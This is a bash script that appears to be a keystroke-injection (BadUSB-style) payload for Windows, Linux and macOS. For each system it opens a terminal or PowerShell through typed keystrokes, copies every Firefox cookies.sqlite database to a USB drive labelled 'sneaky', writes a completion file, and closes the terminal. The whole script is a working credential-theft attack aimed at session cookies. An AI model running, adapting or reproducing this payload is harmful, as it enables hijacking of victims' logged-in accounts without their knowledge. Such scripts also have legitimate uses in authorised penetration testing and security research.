#!/bin/bash

function quackWindows() {

        # open normal powershell (non admin)
        Q GUI r
        Q DELAY 500
        Q STRING powershell
        Q ENTER
        Q DELAY 500

	# get drive
        Q STRING '$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq'
        Q STRING " 'sneaky'"
        Q STRING ' } | select -expand name'
        Q ENTER

	# copy all firefox cookies DBs
	Q STRING '$counter = 0 ; Get-ChildItem -Path .\AppData\Roaming\Mozilla\Firefox\Profiles\ | Foreach-Object { cp (Join-Path $_.FullName'
	Q STRING " 'cookies.sqlite')"
	Q STRING ' $usbPath'
	Q STRING "'cookies'"
	Q STRING '$counter'
	Q STRING "'.sqlite' ;"
	Q STRING ' $counter++ }'

	# write done file
	Q STRING ' ; if ($?) {'
        Q STRING ' [IO.File]::WriteAllLines((Join-Path $usbPath'
        Q STRING " 'done.txt'), 'done') ; Write-VolumeCache"
        Q STRING ' $usbPath[0] ; exit}'
        Q ENTER
        Q ESCAPE
        Q ESCAPE
}

function quackLinux() {

        # open terminal via search menu
        Q GUI
        Q DELAY 1500
        Q STRING "ter"
        # needed otherwise console might bug
        Q DELAY 500
        Q ENTER
        Q DELAY 2000

	# copy all firefox DBs and write done file
	Q STRING "counter=0 && for dir in ~/.mozilla/firefox/*/ ; do if [["
	Q STRING ' $dir != *'
	Q STRING "'Crash'* &&"
	Q STRING ' $dir !='
	Q STRING " *'Pending'* ]]; then cp -r"
	Q STRING ' $dir/cookies.sqlite /media/$(users)/sneaky/cookies$counter.sqlite 2>/dev/null ; ((counter=counter+1)); fi ; done && echo'
	Q STRING " 'done' > /media/"
	Q STRING '$(users)/sneaky/done.txt && sync && exit'
	Q ENTER
}

function quackMac() {

	# open mac terminal
        Q GUI SPACE
	Q DELAY 3000
	Q STRING "termi"
	Q DELAY 500
	Q ENTER
	Q DELAY 3000

	# copy all firefox DBs and write done file
	Q STRING "counter=0 && for dir in"
	Q STRING ' "/Users/$(users)/Library/Application Support/Firefox/Profiles/\"* ; do cp -r $dir/cookies.sqlite /Volumes/sneaky/cookies$counter.sqlite 2>/dev/null ; ((counter=counter+1)) ; done && echo'
	Q STRING " 'done' > /Volumes/sneaky/cookies.txt && sync && pkill -a Terminal"
	Q ENTER
}

case $1 in

  Windows)
    quackWindows
    ;;

  Linux)
    quackLinux
    ;;

  Mac)
    quackMac
    ;;

esac
